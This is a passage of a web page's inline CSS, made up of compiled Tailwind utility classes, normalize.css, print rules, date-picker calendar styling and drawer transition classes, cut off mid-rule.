        }

        .disabled\:\!bg-gray-300:disabled {
            --tw-bg-opacity: 1 !important;
            background-color: rgb(209 213 219/var(--tw-bg-opacity, 1)) !important
        }

        .disabled\:\!bg-primary:disabled {
            --tw-bg-opacity: 1 !important;
            background-color: rgb(0 90 171/var(--tw-bg-opacity, 1)) !important
        }

        .disabled\:bg-bw-100:disabled {
            --tw-bg-opacity: 1;
            background-color: rgb(242 242 242/var(--tw-bg-opacity, 1))
        }

        .disabled\:bg-gray-100:disabled {
            --tw-bg-opacity: 1;
            background-color: rgb(243 244 246/var(--tw-bg-opacity, 1))
        }

        .disabled\:bg-gray-200:disabled {
            --tw-bg-opacity: 1;
            background-color: rgb(229 231 235/var(--tw-bg-opacity, 1))
        }

        .disabled\:text-\[\#808080\]:disabled {
            --tw-text-opacity: 1;
            color: rgb(128 128 128/var(--tw-text-opacity, 1))
        }

        .disabled\:text-bw-500:disabled {
            --tw-text-opacity: 1;
            color: rgb(134 134 134/var(--tw-text-opacity, 1))
        }

        .disabled\:text-gray-400:disabled {
            --tw-text-opacity: 1;
            color: rgb(156 163 175/var(--tw-text-opacity, 1))
        }

        .disabled\:text-gray-500:disabled {
            --tw-text-opacity: 1;
            color: rgb(107 114 128/var(--tw-text-opacity, 1))
        }

        .disabled\:text-opacity-55:disabled {
            --tw-text-opacity: .55
        }

        .disabled\:opacity-50:disabled {
            opacity: .5
        }

        .disabled\:checked\:\!bg-none:checked:disabled {
            background-image: none !important
        }

        .group:hover .group-hover\:block,
        .group\/edit:hover .group-hover\/edit\:block {
            display: block
        }

        .group:hover .group-hover\:\!flex {
            display: flex !important
        }

        .group:hover .group-hover\:grid {
            display: grid
        }

        .group:hover .group-hover\:-translate-y-5 {
            --tw-translate-y: -1.25rem;
            transform: translate(var(--tw-translate-x), var(--tw-translate-y)) rotate(var(--tw-rotate)) skew(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y))
        }

        .peer:checked~.peer-checked\:bg-primary {
            --tw-bg-opacity: 1;
            background-color: rgb(0 90 171/var(--tw-bg-opacity, 1))
        }

        .peer:checked~.peer-checked\:bg-primary-100 {
            --tw-bg-opacity: 1;
            background-color: rgb(229 239 247/var(--tw-bg-opacity, 1))
        }

        .peer:checked~.peer-checked\:after\:translate-x-full:after {
            content: var(--tw-content);
            --tw-translate-x: 100%;
            transform: translate(var(--tw-translate-x), var(--tw-translate-y)) rotate(var(--tw-rotate)) skew(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y))
        }

        .peer:checked~.peer-checked\:after\:border-white:after {
            content: var(--tw-content);
            --tw-border-opacity: 1;
            border-color: rgb(255 255 255/var(--tw-border-opacity, 1))
        }

        @media not all and (min-width:768px) {
            .max-md\:fixed {
                position: fixed
            }

            .max-md\:absolute {
                position: absolute
            }

            .max-md\:left-0 {
                left: 0
            }

            .max-md\:left-2 {
                left: .5rem
            }

            .max-md\:top-\[calc\(100\%\)\] {
                top: 100%
            }

            .max-md\:col-span-2 {
                grid-column: span 2/span 2
            }

            .max-md\:col-span-3 {
                grid-column: span 3/span 3
            }

            .max-md\:col-span-full {
                grid-column: 1/-1
            }

            .max-md\:col-start-2 {
                grid-column-start: 2
            }

            .max-md\:\!hidden {
                display: none !important
            }

            .max-md\:hidden {
                display: none
            }

            .max-md\:aspect-\[2\/1\] {
                aspect-ratio: 2/1
            }

            .max-md\:aspect-\[4\/1\] {
                aspect-ratio: 4/1
            }

            .max-md\:size-9 {
                height: 2.25rem;
                width: 2.25rem
            }

            .max-md\:h-11 {
                height: 2.75rem
            }

            .max-md\:h-9 {
                height: 2.25rem
            }

            .max-md\:min-h-\[calc\(100vh-128px\)\] {
                min-height: calc(100vh - 128px)
            }

            .max-md\:w-\[calc\(16\.66\%-4px\)\] {
                width: calc(16.66% - 4px)
            }

            .max-md\:w-\[calc\(83\.33\%-4px\)\] {
                width: calc(83.33% - 4px)
            }

            .max-md\:w-full {
                width: 100%
            }

            .max-md\:max-w-\[60vw\] {
                max-width: 60vw
            }

            .max-md\:flex-1 {
                flex: 1 1 0%
            }

            .max-md\:basis-1\/2 {
                flex-basis: 50%
            }

            .max-md\:scale-\[0\.6\] {
                --tw-scale-x: .6;
                --tw-scale-y: .6;
                transform: translate(var(--tw-translate-x), var(--tw-translate-y)) rotate(var(--tw-rotate)) skew(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y))
            }

            .max-md\:flex-col {
                flex-direction: column
            }

            .max-md\:flex-col-reverse {
                flex-direction: column-reverse
            }

            .max-md\:flex-wrap {
                flex-wrap: wrap
            }

            .max-md\:items-center {
                align-items: center
            }

            .max-md\:justify-center {
                justify-content: center
            }

            .max-md\:justify-between {
                justify-content: space-between
            }

            .max-md\:gap-2 {
                gap: .5rem
            }

            .max-md\:gap-3 {
                gap: .75rem
            }

            .max-md\:gap-4 {
                gap: 1rem
            }

            .max-md\:divide-y>:not([hidden])~:not([hidden]) {
                --tw-divide-y-reverse: 0;
                border-bottom-width: calc(1px*var(--tw-divide-y-reverse));
                border-top-width: calc(1px*(1 - var(--tw-divide-y-reverse)))
            }

            .max-md\:text-nowrap {
                text-wrap: nowrap
            }

            .max-md\:rounded-2xl {
                border-radius: 1rem
            }

            .max-md\:rounded-3xl {
                border-radius: 1.5rem
            }

            .max-md\:border {
                border-width: 1px
            }

            .max-md\:border-b {
                border-bottom-width: 1px
            }

            .max-md\:border-t {
                border-top-width: 1px
            }

            .max-md\:\!bg-primary {
                --tw-bg-opacity: 1 !important;
                background-color: rgb(0 90 171/var(--tw-bg-opacity, 1)) !important
            }

            .max-md\:\!bg-white {
                --tw-bg-opacity: 1 !important;
                background-color: rgb(255 255 255/var(--tw-bg-opacity, 1)) !important
            }

            .max-md\:bg-primary {
                --tw-bg-opacity: 1;
                background-color: rgb(0 90 171/var(--tw-bg-opacity, 1))
            }

            .max-md\:bg-white {
                --tw-bg-opacity: 1;
                background-color: rgb(255 255 255/var(--tw-bg-opacity, 1))
            }

            .max-md\:p-3 {
                padding: .75rem
            }

            .max-md\:p-4 {
                padding: 1rem
            }

            .max-md\:\!px-4 {
                padding-left: 1rem !important;
                padding-right: 1rem !important
            }

            .max-md\:px-2 {
                padding-left: .5rem;
                padding-right: .5rem
            }

            .max-md\:px-3 {
                padding-left: .75rem;
                padding-right: .75rem
            }

            .max-md\:py-1 {
                padding-bottom: .25rem;
                padding-top: .25rem
            }

            .max-md\:py-2 {
                padding-bottom: .5rem;
                padding-top: .5rem
            }

            .max-md\:py-4 {
                padding-bottom: 1rem;
                padding-top: 1rem
            }

            .max-md\:\!pl-16 {
                padding-left: 4rem !important
            }

            .max-md\:pl-5 {
                padding-left: 1.25rem
            }

            .max-md\:pt-4 {
                padding-top: 1rem
            }

            .max-md\:text-left {
                text-align: left
            }

            .max-md\:text-center {
                text-align: center
            }

            .max-md\:\!text-base {
                font-size: 1rem !important;
                line-height: 1.5rem !important
            }

            .max-md\:\!text-xs {
                font-size: .75rem !important;
                line-height: 1rem !important
            }

            .max-md\:text-sm {
                font-size: .875rem;
                line-height: 1.25rem
            }

            .max-md\:text-xs {
                font-size: .75rem;
                line-height: 1rem
            }

            .max-md\:\!text-primary {
                --tw-text-opacity: 1 !important;
                color: rgb(0 90 171/var(--tw-text-opacity, 1)) !important
            }

            .max-md\:text-white {
                --tw-text-opacity: 1;
                color: rgb(255 255 255/var(--tw-text-opacity, 1))
            }

            .\*\:max-md\:min-h-\[150px\]>* {
                min-height: 150px
            }

            .max-md\:\*\:flex-1>* {
                flex: 1 1 0%
            }

            .\*\:max-md\:flex-col>* {
                flex-direction: column
            }

            .\*\:max-md\:text-sm>* {
                font-size: .875rem;
                line-height: 1.25rem
            }

            .max-md\:\*\:text-xs>* {
                font-size: .75rem;
                line-height: 1rem
            }
        }

        @media not all and (min-width:640px) {
            .max-sm\:w-full {
                width: 100%
            }

            .max-sm\:flex-wrap {
                flex-wrap: wrap
            }

            .max-sm\:\!text-xs {
                font-size: .75rem !important;
                line-height: 1rem !important
            }
        }

        @media (min-width:640px) {
            .sm\:w-1\/2 {
                width: 50%
            }

            .sm\:grid-cols-3 {
                grid-template-columns: repeat(3, minmax(0, 1fr))
            }

            .sm\:grid-cols-7 {
                grid-template-columns: repeat(7, minmax(0, 1fr))
            }

            .sm\:\!text-sm {
                font-size: .875rem !important;
                line-height: 1.25rem !important
            }
        }

        @media (min-width:768px) {
            .md\:absolute {
                position: absolute
            }

            .md\:sticky {
                position: sticky
            }

            .md\:-left-16 {
                left: -4rem
            }

            .md\:-right-16 {
                right: -4rem
            }

            .md\:bottom-10 {
                bottom: 2.5rem
            }

            .md\:bottom-2 {
                bottom: .5rem
            }

            .md\:bottom-6 {
                bottom: 1.5rem
            }

            .md\:left-0 {
                left: 0
            }

            .md\:left-10 {
                left: 2.5rem
            }

            .md\:left-\[50\%\] {
                left: 50%
            }

            .md\:right-4 {
                right: 1rem
            }

            .md\:right-\[calc\(100\%-24px\)\] {
                right: calc(100% - 24px)
            }

            .md\:top-0 {
                top: 0
            }

            .md\:top-32 {
                top: 8rem
            }

            .md\:top-36 {
                top: 9rem
            }

            .md\:top-52 {
                top: 13rem
            }

            .md\:top-6 {
                top: 1.5rem
            }

            .md\:top-\[calc\(110\%\)\] {
                top: 110%
            }

            .md\:col-span-1 {
                grid-column: span 1/span 1
            }

            .md\:col-span-2 {
                grid-column: span 2/span 2
            }

            .md\:col-span-3 {
                grid-column: span 3/span 3
            }

            .md\:col-span-4 {
                grid-column: span 4/span 4
            }

            .md\:col-span-5 {
                grid-column: span 5/span 5
            }

            .md\:col-span-7 {
                grid-column: span 7/span 7
            }

            .md\:col-start-2 {
                grid-column-start: 2
            }

            .md\:ml-auto {
                margin-left: auto
            }

            .md\:mt-2 {
                margin-top: .5rem
            }

            .md\:mt-28 {
                margin-top: 7rem
            }

            .md\:mt-52 {
                margin-top: 13rem
            }

            .md\:mt-\[112px\] {
                margin-top: 112px
            }

            .md\:block {
                display: block
            }

            .md\:flex {
                display: flex
            }

            .md\:grid {
                display: grid
            }

            .md\:\!hidden {
                display: none !important
            }

            .md\:hidden {
                display: none
            }

            .md\:\!size-10 {
                height: 2.5rem !important;
                width: 2.5rem !important
            }

            .md\:\!size-12 {
                height: 3rem !important;
                width: 3rem !important
            }

            .md\:size-16 {
                height: 4rem;
                width: 4rem
            }

            .md\:size-24 {
                height: 6rem;
                width: 6rem
            }

            .md\:\!h-9 {
                height: 2.25rem !important
            }

            .md\:h-40 {
                height: 10rem
            }

            .md\:h-5 {
                height: 1.25rem
            }

            .md\:h-\[112px\] {
                height: 112px
            }

            .md\:h-\[354px\] {
                height: 354px
            }

            .md\:h-\[400px\] {
                height: 400px
            }

            .md\:h-\[calc\(100vh-112px\)\] {
                height: calc(100vh - 112px)
            }

            .md\:h-full {
                height: 100%
            }

            .md\:min-h-\[250px\] {
                min-height: 250px
            }

            .md\:w-1\/2 {
                width: 50%
            }

            .md\:w-1\/3 {
                width: 33.333333%
            }

            .md\:w-1\/4 {
                width: 25%
            }

            .md\:w-1\/6 {
                width: 16.666667%
            }

            .md\:w-2\/3 {
                width: 66.666667%
            }

            .md\:w-24 {
                width: 6rem
            }

            .md\:w-28 {
                width: 7rem
            }

            .md\:w-3\/4 {
                width: 75%
            }

            .md\:w-48 {
                width: 12rem
            }

            .md\:w-\[36\%\] {
                width: 36%
            }

            .md\:w-\[480px\] {
                width: 480px
            }

            .md\:min-w-60 {
                min-width: 15rem
            }

            .md\:min-w-\[400px\] {
                min-width: 400px
            }

            .md\:min-w-\[472px\] {
                min-width: 472px
            }

            .md\:max-w-\[46vw\] {
                max-width: 46vw
            }

            .md\:max-w-\[90\%\] {
                max-width: 90%
            }

            .md\:-translate-x-1\/2 {
                --tw-translate-x: -50%
            }

            .md\:-translate-x-1\/2,
            .md\:-translate-y-1\/2 {
                transform: translate(var(--tw-translate-x), var(--tw-translate-y)) rotate(var(--tw-rotate)) skew(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y))
            }

            .md\:-translate-y-1\/2 {
                --tw-translate-y: -50%
            }

            .md\:grid-cols-10 {
                grid-template-columns: repeat(10, minmax(0, 1fr))
            }

            .md\:grid-cols-12 {
                grid-template-columns: repeat(12, minmax(0, 1fr))
            }

            .md\:grid-cols-13 {
                grid-template-columns: repeat(13, minmax(0, 1fr))
            }

            .md\:grid-cols-2 {
                grid-template-columns: repeat(2, minmax(0, 1fr))
            }

            .md\:grid-cols-3 {
                grid-template-columns: repeat(3, minmax(0, 1fr))
            }

            .md\:grid-cols-4 {
                grid-template-columns: repeat(4, minmax(0, 1fr))
            }

            .md\:grid-cols-5 {
                grid-template-columns: repeat(5, minmax(0, 1fr))
            }

            .md\:grid-cols-6 {
                grid-template-columns: repeat(6, minmax(0, 1fr))
            }

            .md\:grid-cols-7 {
                grid-template-columns: repeat(7, minmax(0, 1fr))
            }

            .md\:grid-cols-8 {
                grid-template-columns: repeat(8, minmax(0, 1fr))
            }

            .md\:grid-rows-3 {
                grid-template-rows: repeat(3, minmax(0, 1fr))
            }

            .md\:flex-col {
                flex-direction: column
            }

            .md\:items-start {
                align-items: flex-start
            }

            .md\:items-end {
                align-items: flex-end
            }

            .md\:items-center {
                align-items: center
            }

            .md\:justify-end {
                justify-content: flex-end
            }

            .md\:justify-center {
                justify-content: center
            }

            .md\:gap-10 {
                gap: 2.5rem
            }

            .md\:gap-12 {
                gap: 3rem
            }

            .md\:gap-2 {
                gap: .5rem
            }

            .md\:gap-20 {
                gap: 5rem
            }

            .md\:gap-3 {
                gap: .75rem
            }

            .md\:gap-4 {
                gap: 1rem
            }

            .md\:gap-6 {
                gap: 1.5rem
            }

            .md\:gap-7 {
                gap: 1.75rem
            }

            .md\:gap-8 {
                gap: 2rem
            }

            .md\:divide-x>:not([hidden])~:not([hidden]) {
                --tw-divide-x-reverse: 0;
                border-left-width: calc(1px*(1 - var(--tw-divide-x-reverse)));
                border-right-width: calc(1px*var(--tw-divide-x-reverse))
            }

            .md\:whitespace-nowrap {
                white-space: nowrap
            }

            .md\:rounded-2xl {
                border-radius: 1rem
            }

            .md\:rounded-3xl {
                border-radius: 1.5rem
            }

            .md\:rounded-lg {
                border-radius: .5rem
            }

            .md\:rounded-xl {
                border-radius: .75rem
            }

            .md\:border-l {
                border-left-width: 1px
            }

            .md\:bg-white {
                --tw-bg-opacity: 1;
                background-color: rgb(255 255 255/var(--tw-bg-opacity, 1))
            }

            .md\:p-1 {
                padding: .25rem
            }

            .md\:p-2 {
                padding: .5rem
            }

            .md\:p-3 {
                padding: .75rem
            }

            .md\:p-4 {
                padding: 1rem
            }

            .md\:p-6 {
                padding: 1.5rem
            }

            .md\:p-8 {
                padding: 2rem
            }

            .md\:p-\[2px\] {
                padding: 2px
            }

            .md\:px-10 {
                padding-left: 2.5rem;
                padding-right: 2.5rem
            }

            .md\:px-3 {
                padding-left: .75rem;
                padding-right: .75rem
            }

            .md\:px-4 {
                padding-left: 1rem;
                padding-right: 1rem
            }

            .md\:px-6 {
                padding-left: 1.5rem;
                padding-right: 1.5rem
            }

            .md\:px-8 {
                padding-left: 2rem;
                padding-right: 2rem
            }

            .md\:px-9 {
                padding-left: 2.25rem;
                padding-right: 2.25rem
            }

            .md\:py-0 {
                padding-bottom: 0;
                padding-top: 0
            }

            .md\:py-10 {
                padding-bottom: 2.5rem;
                padding-top: 2.5rem
            }

            .md\:py-12 {
                padding-bottom: 3rem;
                padding-top: 3rem
            }

            .md\:py-16 {
                padding-bottom: 4rem;
                padding-top: 4rem
            }

            .md\:py-2 {
                padding-bottom: .5rem;
                padding-top: .5rem
            }

            .md\:py-20 {
                padding-bottom: 5rem;
                padding-top: 5rem
            }

            .md\:py-3 {
                padding-bottom: .75rem;
                padding-top: .75rem
            }

            .md\:py-4 {
                padding-bottom: 1rem;
                padding-top: 1rem
            }

            .md\:py-5 {
                padding-bottom: 1.25rem;
                padding-top: 1.25rem
            }

            .md\:py-6 {
                padding-bottom: 1.5rem;
                padding-top: 1.5rem
            }

            .md\:py-8 {
                padding-bottom: 2rem;
                padding-top: 2rem
            }

            .md\:\!pl-52 {
                padding-left: 13rem !important
            }

            .md\:pb-10 {
                padding-bottom: 2.5rem
            }

            .md\:pb-16 {
                padding-bottom: 4rem
            }

            .md\:pb-32 {
                padding-bottom: 8rem
            }

            .md\:pl-10 {
                padding-left: 2.5rem
            }

            .md\:pl-3 {
                padding-left: .75rem
            }

            .md\:pl-4 {
                padding-left: 1rem
            }

            .md\:pl-6 {
                padding-left: 1.5rem
            }

            .md\:pl-8 {
                padding-left: 2rem
            }

            .md\:pt-10 {
                padding-top: 2.5rem
            }

            .md\:pt-12 {
                padding-top: 3rem
            }

            .md\:pt-4 {
                padding-top: 1rem
            }

            .md\:pt-8 {
                padding-top: 2rem
            }

            .md\:\!text-base {
                font-size: 1rem !important;
                line-height: 1.5rem !important
            }

            .md\:text-2xl {
                font-size: 1.5rem;
                line-height: 2rem
            }

            .md\:text-3xl {
                font-size: 1.875rem;
                line-height: 2.25rem
            }

            .md\:text-4xl {
                font-size: 2.25rem;
                line-height: 2.5rem
            }

            .md\:text-base {
                font-size: 1rem;
                line-height: 1.5rem
            }

            .md\:text-lg {
                font-size: 1.125rem;
                line-height: 1.75rem
            }

            .md\:text-sm {
                font-size: .875rem;
                line-height: 1.25rem
            }

            .md\:text-xl {
                font-size: 1.25rem;
                line-height: 1.75rem
            }

            .md\:text-xs {
                font-size: .75rem;
                line-height: 1rem
            }

            .md\:text-primary {
                --tw-text-opacity: 1;
                color: rgb(0 90 171/var(--tw-text-opacity, 1))
            }

            .md\:shadow {
                --tw-shadow: 0 1px 3px 0 #0000001a, 0 1px 2px -1px #0000001a;
                --tw-shadow-colored: 0 1px 3px 0 var(--tw-shadow-color), 0 1px 2px -1px var(--tw-shadow-color)
            }

            .md\:shadow,
            .md\:shadow-sm {
                box-shadow: var(--tw-ring-offset-shadow, 0 0 #0000), var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow)
            }

            .md\:shadow-sm {
                --tw-shadow: 0 1px 2px 0 #0000000d;
                --tw-shadow-colored: 0 1px 2px 0 var(--tw-shadow-color)
            }

            .\*\:md\:size-5>* {
                height: 1.25rem;
                width: 1.25rem
            }

            .md\:\*\:flex-1>* {
                flex: 1 1 0%
            }
        }

        @media (min-width:1024px) {
            .lg\:mt-36 {
                margin-top: 9rem
            }

            .lg\:w-2\/5 {
                width: 40%
            }

            .lg\:pb-24 {
                padding-bottom: 6rem
            }

            .lg\:\!text-base {
                font-size: 1rem !important;
                line-height: 1.5rem !important
            }

            .lg\:text-2xl {
                font-size: 1.5rem;
                line-height: 2rem
            }

            .lg\:text-\[18px\] {
                font-size: 18px
            }

            .lg\:text-lg {
                font-size: 1.125rem;
                line-height: 1.75rem
            }
        }

        .peer:checked~.rtl\:peer-checked\:after\:-translate-x-full:where([dir=rtl], [dir=rtl] *):after {
            content: var(--tw-content);
            --tw-translate-x: -100%;
            transform: translate(var(--tw-translate-x), var(--tw-translate-y)) rotate(var(--tw-rotate)) skew(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y))
        }

        @media (prefers-color-scheme:dark) {
            .dark\:text-gray-200 {
                --tw-text-opacity: 1;
                color: rgb(229 231 235/var(--tw-text-opacity, 1))
            }
        }

        .\[\&\:not\(\:first-child\)\]\:scroll-mt-44:not(:first-child) {
            scroll-margin-top: 11rem
        }

        .\[\&\:not\(\:first-child\)\]\:py-4:not(:first-child) {
            padding-bottom: 1rem;
            padding-top: 1rem
        }

        .\[\&\:not\(\:last-child\)\]\:border-b:not(:last-child) {
            border-bottom-width: 1px
        }

        .\[\&\>\*\:not\(\:first-child\)\]\:pt-3>:not(:first-child) {
            padding-top: .75rem
        }

        .\[\&\>\.content\]\:justify-start>.content {
            justify-content: flex-start
        }

        .\[\&\>\.product\]\:\!border-0>.product {
            border-width: 0 !important
        }

        .\[\&\>\.product\]\:\!p-0>.product {
            padding: 0 !important
        }

        .\[\&\>div\>\.circle\]\:\!border-primary>div>.circle {
            --tw-border-opacity: 1 !important;
            border-color: rgb(0 90 171/var(--tw-border-opacity, 1)) !important
        }

        .\[\&\>div\>hr\]\:hidden>div>hr {
            display: none
        }

        .\[\&\>div\]\:bg-bw-500>div {
            --tw-bg-opacity: 1;
            background-color: rgb(134 134 134/var(--tw-bg-opacity, 1))
        }

        .\[\&\>div\]\:bg-primary>div {
            --tw-bg-opacity: 1;
            background-color: rgb(0 90 171/var(--tw-bg-opacity, 1))
        }

        @media not all and (min-width:768px) {
            .\[\&\>div\]\:max-md\:mt-\[300px\]>div {
                margin-top: 300px
            }
        }

        .\[\&\>img\]\:\!w-1\/2>img {
            width: 50% !important
        }

        .\[\&\>img\]\:w-1\/4>img {
            width: 25%
        }

        .\[\&\>img\]\:w-1\/5>img {
            width: 20%
        }

        @media not all and (min-width:768px) {
            .\[\&\>img\]\:max-md\:w-1\/2>img {
                width: 50%
            }

            .\[\&\>img\]\:max-md\:w-1\/3>img {
                width: 33.333333%
            }

            .max-md\:\[\&\>img\]\:w-1\/2>img {
                width: 50%
            }
        }

        @media (min-width:768px) {
            .\[\&\>img\]\:md\:w-1\/2>img {
                width: 50%
            }

            .\[\&\>img\]\:md\:w-1\/3>img {
                width: 33.333333%
            }

            .\[\&\>img\]\:md\:w-1\/4>img {
                width: 25%
            }

            .md\:\[\&\>img\]\:\!w-1\/6>img {
                width: 16.666667% !important
            }
        }

        .\[\&\>input\]\:\!h-12>input {
            height: 3rem !important
        }

        .\[\&\>input\]\:\!pl-14>input {
            padding-left: 3.5rem !important
        }

        .\[\&\>label\]\:text-sm>label {
            font-size: .875rem;
            line-height: 1.25rem
        }

        .\[\&\>label\]\:font-bold>label {
            font-weight: 700
        }

        .\[\&\>label\]\:text-bw-700>label {
            --tw-text-opacity: 1;
            color: rgb(86 86 86/var(--tw-text-opacity, 1))
        }

        .\[\&\>span\]\:text-sm>span {
            font-size: .875rem;
            line-height: 1.25rem
        }

        .\[\&\>span\]\:font-medium>span {
            font-weight: 500
        }

        .\[\&\>span\]\:text-bw-700>span {
            --tw-text-opacity: 1;
            color: rgb(86 86 86/var(--tw-text-opacity, 1))
        }

        .\[\&\>span\]\:text-primary>span {
            --tw-text-opacity: 1;
            color: rgb(0 90 171/var(--tw-text-opacity, 1))
        }
    </style>
    <style>
        html {
            box-sizing: border-box;
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale
        }

        *,
        :after,
        :before {
            box-sizing: inherit
        }

        button,
        html,
        input,
        select,
        textarea {
            color: #000
        }

        hr {
            border: 0;
            border-top: 1px solid #ccc;
            display: block;
            height: 1px;
            margin: 1em 0;
            padding: 0
        }

        img {
            max-width: 100%;
            vertical-align: middle
        }

        fieldset {
            border: 0;
            margin: 0;
            padding: 0
        }

        textarea {
            resize: vertical;
            vertical-align: middle
        }

        address {
            font-style: normal
        }

        table {
            border-collapse: collapse;
            border-spacing: 0;
            width: 100%
        }

        figure {
            margin: 0 0 1em
        }

        pre {
            overflow: auto
        }

        canvas {
            vertical-align: middle
        }

        input[type=search] {
            box-sizing: border-box
        }
    </style>
    <style>
        /*! normalize.css v8.0.1 | MIT License | github.com/necolas/normalize.css */
        html {
            line-height: 1.15;
            -webkit-text-size-adjust: 100%
        }

        body {
            margin: 0
        }

        main {
            display: block
        }

        h1 {
            font-size: 2em;
            margin: .67em 0
        }

        hr {
            box-sizing: content-box;
            height: 0;
            overflow: visible
        }

        pre {
            font-family: monospace, monospace;
            font-size: 1em
        }

        a {
            background-color: transparent
        }

        abbr[title] {
            border-bottom: none;
            text-decoration: underline;
            -webkit-text-decoration: underline dotted;
            text-decoration: underline dotted
        }

        b,
        strong {
            font-weight: bolder
        }

        code,
        kbd,
        samp {
            font-family: monospace, monospace;
            font-size: 1em
        }

        small {
            font-size: 80%
        }

        sub,
        sup {
            font-size: 75%;
            line-height: 0;
            position: relative;
            vertical-align: baseline
        }

        sub {
            bottom: -.25em
        }

        sup {
            top: -.5em
        }

        img {
            border-style: none
        }

        button,
        input,
        optgroup,
        select,
        textarea {
            font-family: inherit;
            font-size: 100%;
            line-height: 1.15;
            margin: 0
        }

        button,
        input {
            overflow: visible
        }

        button,
        select {
            text-transform: none
        }

        [type=button],
        [type=reset],
        [type=submit],
        button {
            appearance: button
        }

        [type=button]::-moz-focus-inner,
        [type=reset]::-moz-focus-inner,
        [type=submit]::-moz-focus-inner,
        button::-moz-focus-inner {
            border-style: none;
            padding: 0
        }

        [type=button]:-moz-focusring,
        [type=reset]:-moz-focusring,
        [type=submit]:-moz-focusring,
        button:-moz-focusring {
            outline: 1px dotted ButtonText
        }

        fieldset {
            padding: .35em .75em .625em
        }

        legend {
            box-sizing: border-box;
            color: inherit;
            display: table;
            max-width: 100%;
            padding: 0;
            white-space: normal
        }

        progress {
            vertical-align: baseline
        }

        textarea {
            overflow: auto
        }

        [type=checkbox],
        [type=radio] {
            box-sizing: border-box;
            padding: 0
        }

        [type=number]::-webkit-inner-spin-button,
        [type=number]::-webkit-outer-spin-button {
            height: auto
        }

        [type=search] {
            appearance: textfield;
            outline-offset: -2px
        }

        [type=search]::-webkit-search-decoration {
            -webkit-appearance: none
        }

        ::-webkit-file-upload-button {
            -webkit-appearance: button;
            font: inherit
        }

        details {
            display: block
        }

        summary {
            display: list-item
        }

        [hidden],
        template {
            display: none
        }
    </style>
    <style>
        @media print {
            * {
                background: transparent !important;
                box-shadow: none !important;
                color: #000 !important;
                text-shadow: none !important
            }

            a,
            a:visited {
                text-decoration: underline
            }

            a[href]:after {
                content: " (" attr(href) ")"
            }

            abbr[title]:after {
                content: " (" attr(title) ")"
            }

            .ir a:after,
            a[href^="#"]:after,
            a[href^="javascript:"]:after {
                content: ""
            }

            blockquote,
            pre {
                border: 1px solid #999;
                page-break-inside: avoid
            }

            thead {
                display: table-header-group
            }

            img,
            tr {
                page-break-inside: avoid
            }

            img {
                max-width: 100% !important
            }

            h2,
            h3,
            p {
                orphans: 3;
                widows: 3
            }

            h2,
            h3 {
                page-break-after: avoid
            }

            .hidden-print {
                display: none !important
            }
        }
    </style>
    <style>
        .dp__calendar .dp__calendar_header_item {
            font-size: .75rem;
            line-height: 1rem;
            --tw-text-opacity: 1;
            color: rgb(182 182 182/var(--tw-text-opacity, 1))
        }

        .dp__calendar .dp__range_between {
            --tw-bg-opacity: 1;
            background-color: rgb(229 239 247/var(--tw-bg-opacity, 1));
            --tw-text-opacity: 1;
            color: rgb(0 90 171/var(--tw-text-opacity, 1))
        }

        .dp__calendar .dp__cell_inner {
            border: 0
        }

        .dp__calendar .dp__date_hover {
            border-radius: 9999px
        }

        .dp__calendar .dp__calendar_row .dp__calendar_item:last-child>.dp__cell_inner:not(.dp__range_end, .dp__range_start, .dp__cell_offset) {
            --tw-text-opacity: 1;
            color: rgb(236 33 61/var(--tw-text-opacity, 1))
        }

        .dp__calendar .dp__calendar_row .dp__calendar_item:first-child>.dp__cell_inner {
            border-bottom-left-radius: 9999px;
            border-top-left-radius: 9999px
        }

        .dp__calendar .dp__calendar_row .dp__calendar_item:last-child>.dp__cell_inner {
            border-bottom-right-radius: 9999px;
            border-top-right-radius: 9999px
        }

        .dp__calendar .dp__range_end,
        .dp__calendar .dp__range_start {
            border-radius: 9999px;
            --tw-bg-opacity: 1;
            background-color: rgb(0 90 171/var(--tw-bg-opacity, 1))
        }

        .dp__calendar .dp__calendar_item:has(.dp__range_start) {
            background-image: linear-gradient(to right, var(--tw-gradient-stops));
            --tw-gradient-from: #fff var(--tw-gradient-from-position);
            --tw-gradient-to: hsla(0, 0%, 100%, 0) var(--tw-gradient-to-position);
            --tw-gradient-stops: var(--tw-gradient-from), var(--tw-gradient-to);
            --tw-gradient-to: #e5eff7 var(--tw-gradient-to-position)
        }

        .dp__calendar .dp__calendar_item:has(.dp__range_end) {
            background-image: linear-gradient(to left, var(--tw-gradient-stops));
            --tw-gradient-from: #fff var(--tw-gradient-from-position);
            --tw-gradient-to: hsla(0, 0%, 100%, 0) var(--tw-gradient-to-position);
            --tw-gradient-stops: var(--tw-gradient-from), var(--tw-gradient-to);
            --tw-gradient-to: #e5eff7 var(--tw-gradient-to-position)
        }

        .dp__input {
            padding-right: 44px !important
        }

        .dp__input_icon {
            left: auto !important;
            right: 10px !important
        }

        .custom-clearable .dp--clear-btn {
            right: 40px
        }
    </style>
    <style>
        .drawer {
            height: 100%;
            left: 0;
            position: fixed;
            top: 0;
            width: 100%;
            z-index: 10;
            --tw-bg-opacity: 1;
            background-color: rgb(255 255 255/var(--tw-bg-opacity, 1));
            padding: 2rem;
            transition-duration: .3s;
            transition-timing-function: cubic-bezier(.4, 0, 1, 1)
        }

        .drawer-left {
            transition-duration: .25s;
            transition-property: left;
            transition-timing-function: cubic-bezier(.4, 0, .2, 1)
        }

        .drawer-left-close {
            left: -100%
        }

        .drawer-left-open {
            left: 0
        }

        .drawer-right {
            left: auto !important;
            transition-duration: .25s;
            transition-property: right;
            transition-timing-function: cubic-bezier(.4, 0, .2, 1)
        }

        .drawer-right-close {
            right: -100%
        }

        .drawer-right-open {
            right: 0
        }

        .drawer-top {
            transition-duration: .25s;
            transition-property: top;
            transition-timing-function: cubic-bezier(.4, 0, .2, 1)
        }

        .drawer-top-close {
            top: -100%
        }

        .drawer-top-open {
            top: 0
        }

        .drawer-bottom {
            top: auto !important;
            transition-duration: .25s;
            transition-property: bottom;
